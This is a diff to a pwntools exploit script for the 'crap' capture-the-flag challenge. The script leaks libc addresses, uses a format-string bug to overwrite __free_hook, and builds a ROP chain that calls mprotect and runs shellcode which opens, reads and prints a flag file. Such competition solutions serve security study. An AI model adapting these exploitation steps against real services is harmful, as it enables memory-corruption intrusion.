@@ -11,22 +11,6 @@ remote_libc = '/libc.so.6'
 is_local = False
 is_remote = False
 
-# if len(sys.argv) == 1:
-#     is_local = True
-#     p = process(local_file)
-#     libc = ELF(local_libc)
-# elif len(sys.argv) > 1:
-#     is_remote = True
-#     if len(sys.argv) == 3:
-#         host = sys.argv[1]
-#         port = sys.argv[2]
-#     else:
-#         host, port = sys.argv[1].split(':')
-#     p = remote(host, port)
-#     libc = ELF(remote_libc)
-
-# elf = ELF(local_file)
-
 def debug(cmd=''):
     if is_local: gdb.attach(p,cmd)
 
@@ -69,7 +53,8 @@ def change_ld(binary, ld):
 elf=change_ld('./crap','./lib/ld-linux-x86-64.so.2')
 if len(sys.argv)>1:
     is_remote=True
-    p = remote('asia.crap.tghack.no','6001')
+    #p = remote('asia.crap.tghack.no','6001')
+    p = remote('ctf.taqini.space','10111')
 else:
     is_local=True
     p = elf.process(env={'LD_PRELOAD':'./lib/libc.so.6','LD_LIBRARY_PATH':'lib'})
@@ -101,7 +86,7 @@ write_count_off = 0x202034
 sla('> ','3')
 sla('feedback: ','TaQini')
 sla('Do you want to keep your feedback? (y/n)\n','n')
-# debug('b *$rebase(0x1179)')
+debug('b *$rebase(0x1179)')
 sla('> ','4')
 ru('feedback: ')
 main_arena = uu64(rc(6))
@@ -109,12 +94,12 @@ info_addr('main_arena',main_arena)
 libcbase = main_arena - main_arena_off
 info_addr('libcbase',libcbase)
 sla('> ','1')
-leak = main_arena + 0x22e900
-# leak = main_arena + 0x20
+# leak = main_arena + 0x22e900 # success only in local 
+# leak = libcbase + 0x82b050 # offical
+leak = libcbase + 0x3b4fc0
 sla('addr: ',hex(leak))
-# sla('addr: ',hex(main_arena))
 ru('value: ')
-text = eval(rc(14))
+text = eval(rc(14))-0x202020
 info_addr('text',text)
 
 main = text + 0x1180
@@ -155,7 +140,6 @@ setcontext = libcbase+0x45ba5
 
 info_addr('free_hook',free_hook)
 info_addr('printf',printf)
-# 0x7f7a73e74ba5
 
 sla('> ','2')
 sla('addr/value: ','%s %s'%(hex(free_hook),hex(printf)))
@@ -163,89 +147,55 @@ sla('addr/value: ','%s %s'%(hex(free_hook),hex(printf)))
 buf = bss-0x1260
 info_addr('buf',buf)
 heap = bss-0x32f0
-# open('/flag',0,0x100)
-# ropchain = p64(prdi) + p64(buf+0x108) + p64(prsi) + p64(0) + p64(prdx) + p64(0x100) + p64(prax) + p64(2) + p64(syscall)
-# mprotect(buf,0x1000,7)
-# ropchain += p64(main)
+
 ropchain = p64(prdi) + p64(heap) + p64(prsi) + p64(0x10000) + p64(prdx) + p64(0x7) + p64(mprotect)
 ropchain += p64(buf+0x40+8)
 ropchain += asm('''
-L1:
-        /* open(file='/home/crap/flag.txt', oflag=0, mode=256) */\n
-        /* push '/home/crap/flag.txt\x00' */\n
-        push 0x1010101 ^ 0x747874\n
-        xor dword ptr [rsp], 0x1010101\n
-        mov rax, 0x2e67616c662f7061\n
-        push rax\n
-        mov rax, 0x72632f656d6f682f\n
-        push rax\n
-        mov rdi, rsp\n
-        xor edx, edx\n
-        mov dh, 0x100 >> 8\n
-        xor esi, esi /* 0 */\n
-        /* call open() */\n
-        push SYS_open /* 2 */\n
-        pop rax\n
-        syscall\n
+            /* close(0) */\n
+            xor edi, edi /* 0 */\n
+            push SYS_close /* 3 */\n
+            pop rax\n
+            syscall\n
 
-        pop rcx\n /* stack balance */
-        pop rcx\n /* stack balance */
-        pop rcx\n /* stack balance */
-        cmp eax,0\n
-        jns L1\n
+            /* open(flag) */\n
+            push 0x1010101 ^ 0x747874\n
+            xor dword ptr [rsp], 0x1010101\n
+            mov rax, 0x2e67616c662f7061\n
+            push rax\n
+            mov rax, 0x72632f656d6f682f\n
+            push rax\n
+            mov rdi, rsp\n
+            xor edx, edx\n
+            mov dh, 0x100 >> 8\n
+            xor esi, esi /* 0 */\n
+            push SYS_open /* 2 */\n
+            pop rax\n
+            syscall\n
 
-        /* close(fd=0) */\n
-        xor edi, edi /* 0 */\n
-        /* call close() */\n
-        push SYS_close /* 3 */\n
-        pop rax\n
-        syscall\n
+            /* call read(0,buf,0x40) */\n
+            mov rdi,rax\n
+            mov rsi,%s\n
+            push 0x40\n
+            pop rdx\n
+            push 0x0\n
+            pop rcx\n
+            push 0\n
+            pop rax\n
+            syscall\n
 
-        /* open(file='/home/crap/flag.txt', oflag=0, mode=256) */\n
-        /* push '/home/crap/flag.txt\x00' */\n
-        push 0x1010101 ^ 0x747874\n
-        xor dword ptr [rsp], 0x1010101\n
-        mov rax, 0x2e67616c662f7061\n
-        push rax\n
-        mov rax, 0x72632f656d6f682f\n
-        push rax\n
-        mov rdi, rsp\n
-        xor edx, edx\n
-        mov dh, 0x100 >> 8\n
-        xor esi, esi /* 0 */\n
-        /* call open() */\n
-        push SYS_open /* 2 */\n
-        pop rax\n
-        syscall\n
-
-        push 0\r\n
-        pop rdi\n
-        mov rsi,%s\n
-        push 0x100\n
-        pop rdx\n
-        push 0x0\n
-        pop rcx\n
-        push 0\n
-        pop rax\n
-        syscall\n
-
-        push 1\r\n
-        pop rdi\n
-        mov rsi,%s\n
-        push 0x100\n
-        pop rdx\n
-        push 0x0\n
-        pop rcx\n
-        push 1\n
-        pop rax\n
-        syscall\n
-
-    '''%(buf,buf)
+            /* call write(1,buf,0x40) */\n
+            push 1\r\n
+            pop rdi\n
+            mov rsi,%s\n
+            push 0x40\n
+            pop rdx\n
+            push 0x0\n
+            pop rcx\n
+            push 1\n
+            pop rax\n
+            syscall\n
+    '''%(buf+0x100,buf+0x100)
     )
-
-# ropchain += p64(prdi) + p64(feedback) + p64(prsi) + p64(0x100) + p64(prdx) + p64(stderr) + p64(fgets)
- # + p64(0) + p64(syscall)
-# ropchain = ropchain.ljust(0x100,'\x90') + '/flag\0\0\0'
 
 sla('> ','3')
 sla('feedback: ','%15$p'.ljust(8,'a')+ropchain)
@@ -254,7 +204,6 @@ stack = eval(rc(14))
 retaddr = stack + 8 -280
 info_addr('retaddr',retaddr)
 # debug('b *$rebase(0x0010DD)')
-# debug('')
 
 sla('> ','2')
 sla('addr/value: ','%s %s'%(hex(feedback),hex(0)))
@@ -272,12 +221,7 @@ sla('> ','3')
 sla('feedback: ',p64(0xdeadbeef)*10)
 # debug('b free')
 sla('Do you want to keep your feedback? (y/n)\n','n')
-# sla('> ','2')
-# sla('addr/value: ','%s %s'%(hex(retaddr),hex(read)))
 
 print rc()
-# info_addr('tag',addr)
-# log.warning('--------------')
 
 p.interactive()
-
